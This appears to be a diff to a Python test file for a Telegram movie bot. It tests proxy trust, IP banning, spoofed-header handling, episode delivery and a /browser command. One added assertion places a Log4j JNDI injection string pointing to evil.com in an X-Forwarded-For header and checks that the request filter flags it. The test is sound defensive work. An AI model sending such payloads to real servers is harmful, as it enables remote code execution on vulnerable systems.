@@ -674,21 +674,34 @@ async def test_trusted_proxy_protection_and_real_client_ip():
     assert is_trusted_proxy("169.254.10.1") is True     # Link-local
     assert is_trusted_proxy("172.64.10.5") is True      # Cloudflare range
     assert is_trusted_proxy("104.16.2.1") is True       # Cloudflare range
+    assert is_trusted_proxy("161.97.96.58") is True     # Upstream server
     assert is_trusted_proxy("198.51.100.88") is False   # Begona tashqi IP
     assert is_trusted_proxy("203.0.113.19") is False    # Begona tashqi IP
+    assert is_trusted_proxy("198.51.100.88:8080") is False  # Port normalization
 
     # 2. jail_ip ishonchli proksini hech qachon jail ga tiqmasligi
     security_service.reset_jail()
     security_service.ban_ip("10.0.0.1")
     security_service.ban_ip("172.64.0.1")
+    security_service.ban_ip("161.97.96.58")
     assert security_service.is_ip_banned("10.0.0.1")[0] is False
     assert security_service.is_ip_banned("172.64.0.1")[0] is False
+    assert security_service.is_ip_banned("161.97.96.58")[0] is False
 
     # Begona tajovuzkor IP esa to'g'ri jail ga tushishi
     security_service.ban_ip("203.0.113.55")
     assert security_service.is_ip_banned("203.0.113.55")[0] is True
 
-    # 3. get_real_client_ip sinovi
+    # 3. get_real_client_ip sinovi: to'g'ridan-to'g'ri bog'langan tajovuzkor soxta sarlavhalari inkor qilinishi
+    mock_direct_req = MagicMock(remote="203.0.113.88", headers={"CF-Connecting-IP": "1.2.3.4"})
+    assert get_real_client_ip(mock_direct_req) == "203.0.113.88"
+
+    mock_proxy_req = MagicMock(remote="10.0.0.1", headers={"X-Forwarded-For": "198.51.100.88:8080, 10.0.0.1"})
+    assert get_real_client_ip(mock_proxy_req) == "198.51.100.88"
+
+    # Header xavflari (Log4j in XFF) 403 bilan to'silishi
+    assert is_malicious_request("/api/movies", user_agent="Mozilla/5.0", headers={"x-forwarded-for": "${jndi:ldap://evil.com/x}"})[0] is True
+
     app = create_web_app()
     server = TestServer(app)
     client = TestClient(server)
@@ -760,11 +773,71 @@ async def test_tv_endpoints_and_movie_part1_streaming_delivery():
         assert config.BOT_USERNAME.lstrip("@") in caption
         assert "Zakirov" not in caption
 
-        # 3. extract_movie_code_and_part orqali '101 1-qism ko'rish' testi
+        # Serial "Chuqur" (code 287) 1-qism yetkazish testi
+        bot_mock.send_video.reset_mock()
+        res_chuqur = await movie_service.deliver_movie(
+            bot=bot_mock,
+            chat_id=12345678,
+            code="287",
+            part=1
+        )
+        assert res_chuqur is True
+        assert bot_mock.send_video.called
+        call_kwargs2 = bot_mock.send_video.call_args.kwargs
+        assert call_kwargs2.get("supports_streaming") is True
+        caption2 = call_kwargs2.get("caption", "")
+        assert "1-qism" in caption2
+        assert config.CHANNEL_USERNAME in caption2
+
+        # 3. extract_movie_code_and_part orqali '101 1-qism ko'rish' va 'chuqur 1qism korish' testi
         from handlers.movies import extract_movie_code_and_part
         assert extract_movie_code_and_part("101 1-qism ko'rish") == ("101", 1)
         assert extract_movie_code_and_part("101 1 qism korish") == ("101", 1)
         assert extract_movie_code_and_part("717 2-qism tomosha") == ("717", 2)
+        assert extract_movie_code_and_part("chuqur 1qism korish") == ("287", 1)
+        assert extract_movie_code_and_part("chuqur 1-qism") == ("287", 1)
+        assert extract_movie_code_and_part("cukur 1-qism") == ("287", 1)
     finally:
         await client.close()
+
+
+# =====================================================================
+# 12. /BROWSER KOMANDASI VA WEB APP BRAUZER TESTI
+# =====================================================================
+@pytest.mark.asyncio
+async def test_cmd_browser_integration():
+    """/browser komandasi @Zakirovsfilms_bot va kinolar bilan Bauntys brendida to'liq ishlashi."""
+    from handlers.movies import cmd_browser
+    bot_mock = AsyncMock()
+    msg_mock = AsyncMock()
+    msg_mock.bot = bot_mock
+    msg_mock.chat = MagicMock(id=123456)
+    msg_mock.from_user = MagicMock(id=123456)
+    msg_mock.message_id = 111
+    msg_mock.reply = AsyncMock()
+
+    # 1. Oddiy /browser
+    msg_mock.text = "/browser"
+    await cmd_browser(msg_mock)
+    assert msg_mock.reply.called
+    reply_call = msg_mock.reply.call_args
+    text = reply_call.args[0] if reply_call.args else reply_call.kwargs.get("text", "")
+    assert "Bauntys Web App Brauzeriga" in text
+    kb = reply_call.kwargs.get("reply_markup")
+    assert kb is not None
+
+    # 2. /browser @Zakirovsfilms_bot
+    msg_mock.reply.reset_mock()
+    msg_mock.text = "/browser @Zakirovsfilms_bot"
+    await cmd_browser(msg_mock)
+    assert msg_mock.reply.called
+
+    # 3. /browser chuqur 1-qism
+    sent_mock = MagicMock()
+    sent_mock.video = MagicMock(file_id="BAACAgIAAxkBAAE_SAMPLE_REAL_287", duration=90, file_size=12000000)
+    bot_mock.send_video = AsyncMock(return_value=sent_mock)
+    msg_mock.reply.reset_mock()
+    msg_mock.text = "/browser chuqur 1-qism"
+    await cmd_browser(msg_mock)
+    assert bot_mock.send_video.called
 
